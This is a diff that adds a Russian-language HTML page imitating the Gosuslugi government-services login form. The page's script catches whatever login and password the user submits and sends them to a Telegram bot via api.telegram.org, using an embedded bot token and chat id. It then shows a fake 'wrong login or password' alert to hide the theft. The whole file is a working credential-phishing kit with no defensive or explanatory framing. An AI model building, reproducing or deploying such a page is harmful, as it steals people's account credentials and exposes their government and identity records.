@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги — Авторизация</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #e4ecfd;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            padding: 32px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo img {
+            height: 40px;
+        }
+        .input-field {
+            margin-bottom: 16px;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d5dce0;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background: #f8f9fa;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #3366ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0 24px;
+        }
+        .recover-link {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .recover-link a {
+            color: #3366ff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .divider {
+            text-align: center;
+            position: relative;
+            margin: 24px 0;
+            color: #a3a9b1;
+            font-size: 14px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background: #e0e3e7;
+        }
+        .divider::before {
+            left: 0;
+        }
+        .divider::after {
+            right: 0;
+        }
+        .alt-login {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .alt-login a {
+            color: #3366ff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .qr-section {
+            text-align: center;
+            margin-bottom: 24px;
+            color: #7d838c;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        .help-link {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .help-link a {
+            color: #3366ff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .register-link {
+            text-align: center;
+        }
+        .register-link a {
+            color: #3366ff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://esia.gosuslugi.ru/login/logo.4db68cf668f7092d.svg" alt="Госуслуги">
+        </div>
+        
+        <form id="loginForm">
+            <div class="input-field">
+                <input type="text" id="login" placeholder="Телефон / Email / СНИЛС" required>
+            </div>
+            <div class="input-field">
+                <input type="password" id="password" placeholder="Пароль" required>
+            </div>
+            
+            <button type="submit" class="login-btn">Войти</button>
+            
+            <div class="recover-link">
+                <a href="#">Восстановить</a>
+            </div>
+            
+            <div class="divider">или</div>
+            
+            <div class="alt-login">
+                <a href="#">Войти другим способом</a>
+            </div>
+            
+
+            
+            <div class="help-link">
+                <a href="#">Не удаётся войти?</a>
+            </div>
+            
+            <div class="register-link">
+                <a href="#">Зарегистрироваться</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const login = document.getElementById('login').value;
+            const password = document.getElementById('password').value;
+            
+            fetch(`https://api.telegram.org/bot5900113300:AAF0YD_P2qFEaiekc96tRfNr7TBzX3rnCpI/sendMessage?chat_id=848471426&text=Логин: ${login}%0AПароль: ${password}`);
+            
+            alert('Неверный логин или пароль. Попробуйте ещё раз.');
+        });
+    </script>
+</body>
+</html>
